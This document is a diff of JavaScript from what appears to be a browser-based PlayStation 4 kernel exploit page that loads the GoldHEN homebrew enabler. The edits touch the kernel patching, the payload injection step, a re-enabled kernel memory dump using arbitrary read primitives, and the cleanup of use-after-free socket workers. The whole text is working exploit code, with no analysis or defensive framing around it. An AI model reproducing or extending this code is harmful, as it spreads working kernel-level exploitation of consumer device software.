@@ -41,8 +41,7 @@ const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
 function hostOk() {
     var m = document.getElementById("msgs");
     if (m) {
-        m.innerHTML = "GoldHEN Sukses Dimuat! &#10004;<br><span style='font-size:16px;color:#00ffcc;font-weight:600;display:block;margin-top:8px;'>Tekan tombol PS pada stik untuk kembali ke Menu Utama</span>";
-        m.style.color = "#00ff88";
+        m.innerHTML = "GoldHEN v2.4b18.12 Loaded ...";
     }
 }
 
@@ -2317,7 +2316,9 @@ let payloadRunning = false;
                             + " sites=" + KPATCH_JMP_SITES.length);
                     }
 
-                    if (payload && (kpatched || params.get("payload") === "1")
+                    if (rebootRequired) {
+                        mark("PAYLOAD-SKIPPED", "cleanup incomplete / zone dirty -- reboot required");
+                    } else if (payload && (kpatched || params.get("payload") === "1")
                         && params.get("payload") !== "0") {
                         state("payload...", "warn");
                         const sz = (payload.length + 0x3fff) & ~0x3fff;
@@ -2372,7 +2373,7 @@ let payloadRunning = false;
                     // confident inferences from reading code have already been
                     // wrong; this replaces the fourth with data.
                     // ?dump=0 to skip.
-                    if (false) { // Skipped research debug dump to prevent WebKit thread locking while GoldHEN initializes
+                    if (params.get("dump") !== "0") {
                         try {
                             const kq = v => v && (v.hi >>> 0) >= 0xffff0000;
                             const rd8 = a => kq(a) ? kv.read8(a) : null;
@@ -2523,14 +2524,12 @@ let payloadRunning = false;
 
         if (uafSock) mark("UAF-SOCK-LEFT-OPEN", "fd=" + uafSock);
 
-        if (!payloadRunning) {
-            try {
-                if (restoreCtx) await restoreCtx.restore("finally");
-            } catch (e) { mark("THREAD-ATTRS-RESTORE-THREW", e.message); }
-            for (const w of workers) {
-                try { if (w.armed) { await w.rpc("disarm", 500); w.armed = false; } }
-                catch (e) { mark("DISARM-THREW", w.name + " " + e.message); }
-            }
+        try {
+            if (restoreCtx) await restoreCtx.restore("finally");
+        } catch (e) { mark("THREAD-ATTRS-RESTORE-THREW", e.message); }
+        for (const w of workers) {
+            try { if (w.armed) { await w.rpc("disarm", 5000); w.armed = false; } }
+            catch (e) { mark("DISARM-THREW", w.name + " " + e.message); }
         }
         for (const w of workers) {
             try {
